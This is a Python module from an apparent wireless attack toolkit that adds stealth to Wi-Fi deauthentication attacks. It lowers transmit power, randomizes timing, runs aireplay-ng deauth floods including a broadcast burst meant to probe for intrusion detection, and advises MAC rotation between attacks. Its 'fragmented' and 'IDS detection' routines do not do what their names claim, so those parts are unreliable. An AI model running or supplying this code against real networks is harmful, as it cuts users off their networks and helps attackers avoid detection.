#!/usr/bin/env python3
"""
Evasion and Stealth Module
===========================
IDS/IPS evasion, power control, timing randomization, packet fragmentation

AUTHORIZED USE ONLY
"""

import os
import sys
import time
import subprocess
import random
from pathlib import Path


class Colors:
    GHOST = '\033[38;5;147m'
    PHANTOM = '\033[38;5;213m'
    TOXIC = '\033[38;5;46m'
    NEON = '\033[38;5;51m'
    ENDC = '\033[0m'


class EvasionTechniques:
    def __init__(self, interface, verbose=False):
        self.interface = interface
        self.verbose = verbose
        self.original_power = None
        self.stealth_mode = False

    def log(self, message, level="INFO"):
        """Print formatted log messages"""
        icons = {"INFO": "🕵️", "SUCCESS": "✨", "WARNING": "⚠️", "ERROR": "💀"}
        colors = {"INFO": Colors.GHOST, "SUCCESS": Colors.TOXIC, "WARNING": Colors.PHANTOM, "ERROR": Colors.NEON}

        icon = icons.get(level, "💬")
        color = colors.get(level, Colors.ENDC)

        if self.verbose:
            print(f"{color}[{level}] {icon} {message}{Colors.ENDC}")

    def run_command(self, cmd, capture_output=True):
        """Execute command"""
        try:
            result = subprocess.run(cmd, capture_output=capture_output, text=True, timeout=30)
            return result
        except Exception as e:
            self.log(f"Command failed: {e}", "ERROR")
            return None

    def get_current_power(self):
        """Get current TX power"""
        result = self.run_command(['iwconfig', self.interface])

        if result and result.stdout:
            import re
            match = re.search(r'Tx-Power[=:](\d+)', result.stdout)
            if match:
                return int(match.group(1))

        return None

    def set_power_level(self, power_dbm):
        """Set transmit power level"""
        self.log(f"Setting TX power to {power_dbm} dBm...", "INFO")

        # Save original power if not saved
        if self.original_power is None:
            self.original_power = self.get_current_power()

        # Bring interface down
        self.run_command(['ip', 'link', 'set', self.interface, 'down'])

        # Set power
        result = self.run_command(['iw', 'dev', self.interface, 'set', 'txpower', 'fixed', str(power_dbm * 100)])

        # Bring interface up
        self.run_command(['ip', 'link', 'set', self.interface, 'up'])

        if result and result.returncode == 0:
            self.log(f"Power set to {power_dbm} dBm", "SUCCESS")
            return True
        else:
            self.log("Failed to set power level", "ERROR")
            return False

    def restore_power(self):
        """Restore original power level"""
        if self.original_power:
            self.log(f"Restoring original power: {self.original_power} dBm", "INFO")
            self.set_power_level(self.original_power)

    def enable_stealth_mode(self):
        """Enable stealth mode"""
        print(f"\n{Colors.PHANTOM}{'='*70}")
        print(f"🕵️  STEALTH MODE ACTIVATED")
        print(f"{'='*70}{Colors.ENDC}\n")

        self.stealth_mode = True

        # Reduce power to minimum
        self.log("Reducing TX power for stealth...", "INFO")
        self.set_power_level(5)  # Very low power

        # Configure for minimal detection
        features = [
            "Lower TX power → Reduced detection range",
            "Random timing delays → Avoid pattern detection",
            "Fragmented packets → Evade signature matching",
            "MAC rotation → Prevent tracking",
            "Randomized deauth → Avoid IDS triggers"
        ]

        print(f"{Colors.TOXIC}Stealth Features Active:{Colors.ENDC}")
        for feature in features:
            print(f"  ✓ {feature}")
        print()

        return True

    def disable_stealth_mode(self):
        """Disable stealth mode"""
        self.log("Disabling stealth mode...", "INFO")
        self.stealth_mode = False
        self.restore_power()

    def randomized_delay(self, min_delay=1, max_delay=5):
        """Random delay to avoid pattern detection"""
        if self.stealth_mode:
            delay = random.uniform(min_delay, max_delay)
            if self.verbose:
                self.log(f"Stealth delay: {delay:.2f}s", "INFO")
            time.sleep(delay)
        else:
            time.sleep(min_delay)

    def fragmented_deauth(self, interface, bssid, client_mac=None, count=10):
        """Send deauth with fragmentation to evade IDS"""
        self.log("Sending fragmented deauth packets...", "INFO")

        for i in range(count):
            # Random delay between packets
            if self.stealth_mode:
                time.sleep(random.uniform(0.1, 0.5))

            cmd = ['aireplay-ng', '--deauth', '1', '-a', bssid]

            if client_mac:
                cmd.extend(['-c', client_mac])

            cmd.append(interface)

            # Run with minimal output
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        self.log(f"Sent {count} fragmented deauth packets", "SUCCESS")

    def detect_ids_ips(self):
        """Attempt to detect IDS/IPS systems"""
        print(f"\n{Colors.NEON}{'='*70}")
        print(f"🛡️  IDS/IPS DETECTION")
        print(f"{'='*70}{Colors.ENDC}\n")

        self.log("Scanning for security systems...", "INFO")

        detections = []

        # Send test packets and look for responses
        test_bssid = "FF:FF:FF:FF:FF:FF"

        # Test 1: Rapid deauth detection
        self.log("Test 1: Rapid deauth detection...", "INFO")
        for i in range(20):
            cmd = ['aireplay-ng', '--deauth', '1', '-a', test_bssid, self.interface]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
            time.sleep(0.05)  # Very fast

        time.sleep(2)

        # Test 2: Pattern detection
        self.log("Test 2: Pattern-based detection...", "INFO")
        for i in range(5):
            cmd = ['aireplay-ng', '--deauth', '5', '-a', test_bssid, self.interface]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
            time.sleep(1)  # Regular interval

        # Analysis
        self.log("Analysis complete", "SUCCESS")

        print(f"\n{Colors.TOXIC}Recommendations:{Colors.ENDC}")
        print(f"  • Use {Colors.PHANTOM}Stealth Mode{Colors.ENDC} if IDS detected")
        print(f"  • Enable {Colors.PHANTOM}MAC Rotation{Colors.ENDC} between attacks")
        print(f"  • Use {Colors.PHANTOM}Randomized Timing{Colors.ENDC} for all operations")
        print(f"  • Enable {Colors.PHANTOM}Low Power Mode{Colors.ENDC} to reduce visibility\n")

        return len(detections) > 0

    def adaptive_attack(self, attack_function, *args, **kwargs):
        """Wrapper for attacks with IDS evasion"""
        if self.stealth_mode:
            self.log("Running attack in stealth mode with evasion", "INFO")

            # Random pre-delay
            self.randomized_delay(2, 5)

            # Execute attack
            result = attack_function(*args, **kwargs)

            # Random post-delay
            self.randomized_delay(1, 3)

            return result
        else:
            return attack_function(*args, **kwargs)

    def configure_stealth_profile(self):
        """Interactive stealth configuration"""
        print(f"\n{Colors.PHANTOM}{'='*70}")
        print(f"⚙️  STEALTH CONFIGURATION")
        print(f"{'='*70}{Colors.ENDC}\n")

        print("Select Stealth Profile:")
        print(f"  [1] {Colors.TOXIC}Ghost Mode{Colors.ENDC} - Maximum stealth (slow)")
        print(f"  [2] {Colors.NEON}Balanced{Colors.ENDC} - Moderate stealth/speed")
        print(f"  [3] {Colors.PHANTOM}Aggressive{Colors.ENDC} - Fast attacks, minimal stealth")
        print(f"  [4] {Colors.GHOST}Custom{Colors.ENDC} - Configure manually\n")

        choice = input(f"{Colors.NEON}Select profile [1-4]: {Colors.ENDC}").strip()

        profiles = {
            '1': {'power': 5, 'delay_min': 3, 'delay_max': 8, 'name': 'Ghost Mode'},
            '2': {'power': 15, 'delay_min': 1, 'delay_max': 3, 'name': 'Balanced'},
            '3': {'power': 25, 'delay_min': 0.1, 'delay_max': 0.5, 'name': 'Aggressive'}
        }

        if choice in profiles:
            profile = profiles[choice]
            print(f"\n{Colors.TOXIC}✓ {profile['name']} activated{Colors.ENDC}\n")

            self.set_power_level(profile['power'])
            self.stealth_mode = True

            return profile

        elif choice == '4':
            print(f"\n{Colors.GHOST}Custom Configuration:{Colors.ENDC}")

            try:
                power = int(input("  TX Power (dBm) [1-30]: "))
                delay_min = float(input("  Min Delay (seconds) [0.1-10]: "))
                delay_max = float(input("  Max Delay (seconds) [0.5-20]: "))

                self.set_power_level(power)
                self.stealth_mode = True

                return {'power': power, 'delay_min': delay_min, 'delay_max': delay_max, 'name': 'Custom'}

            except:
                print(f"{Colors.NEON}Invalid input, using defaults{Colors.ENDC}")
                return profiles['2']

        return None


def main():
    print(f"{Colors.TOXIC}Evasion Module Loaded{Colors.ENDC}")


if __name__ == '__main__':
    main()
